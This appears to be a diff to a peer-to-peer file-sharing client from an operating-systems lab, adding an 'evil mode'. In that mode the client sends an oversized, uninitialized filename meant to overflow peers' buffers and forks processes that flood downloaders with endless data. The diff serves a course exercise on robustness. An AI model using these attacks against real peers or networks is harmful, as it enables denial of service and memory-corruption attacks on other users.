@@ -29,13 +29,20 @@ int evil_mode;			// nonzero iff this peer should behave badly
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
 
+//dedicate some processes to harm other peers.
+//keep track of them to kill them later
+#define NUMEVILPROC 16
+pid_t evil_processes[NUMEVILPROC];
+int evil_proc_size = 0;
+
 
 /*****************************************************************************
  * TASK STRUCTURE
  * Holds all information relevant for a peer or tracker connection, including
  * a bounded buffer that simplifies reading from and writing to peers.
  */
-
+//buffer size increased because the peer list did not fit in it for the popular tracker.
+//more elegant solution may be needed
 #define TASKBUFSIZ	65536			// Size of task_t::buf
 #define FILENAMESIZ	256				// Size of task_t::filename
 #define MAXDLSIZE   (1 << 28) // TODO: what should this actually be?
@@ -559,7 +566,15 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	
+	
+	if(evil_mode) //send a long filename to cause buffer Overflow
+        {
+                char longFileName[16*FILENAMESIZ];
+                osp2p_writef(t->peer_fd, "Get %s OSP2P\n",longFileName);
+        }
+        else
+                osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Task 2: buffer overflow?
 	unsigned int length = strlen(t->filename);
@@ -729,12 +744,31 @@ static void task_upload(task_t *t)
 	if(evil_mode)
 	{
 		//we might have successfully fished someone. Pretend we have the file.
-		//fill the file with a lot of bogus maybe?
-		//
+		//send them an infinitely large file in a separate process.
+		if(evil_proc_size < NUMEVILPROC)
+                {
+                        pid_t pid = fork();
+                        if (pid == 0)
+                        {
+                                while(1)
+                                        write_from_taskbuf(t->peer_fd,t);
+                                _exit(0);
+                        } else if (pid < 0) {
+                                error("Evil Fork failed");
+                                _exit(0);
+                        }
+                        else
+                        {
+                                evil_processes[evil_proc_size] = pid;
+                                evil_proc_size++;
+                        }
+                        return;
+                }
+                else
+                        return; //make peer hang
+        }
 
-		//better yet dont respond at all. let them hang
-		return;	
-	}
+	
 
 	// File exists
 	struct stat data;
@@ -897,6 +931,14 @@ int main(int argc, char *argv[])
     	fds += 2;
     }
   }
+
+
+	if(evil_mode)
+        {
+                int i;
+                for(i = 0 ; i < evil_proc_size ; i++)
+                        kill(evil_processes[i],SIGKILL);
+        }
 
 	return 0;
 }
